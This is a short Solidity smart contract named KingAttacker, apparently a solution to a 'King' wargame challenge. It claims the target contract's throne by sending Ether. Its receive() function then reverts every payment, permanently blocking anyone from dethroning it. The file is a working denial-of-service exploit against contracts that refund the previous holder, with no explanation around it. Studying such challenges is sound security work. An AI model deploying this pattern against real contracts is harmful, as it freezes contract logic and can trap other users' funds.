// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
    address payable public kingContract;

    constructor(address payable _kingContract) {
        kingContract = _kingContract;
    }

    function attack() external payable {
        require(msg.value > 0, "Need to send ETH");
        (bool success, ) = kingContract.call{value: msg.value}("");
        require(success, "Attack failed");
    }

    // Block all future Ether transfers to this contract
    receive() external payable {
        revert("You shall not dethrone me!");
    }
}
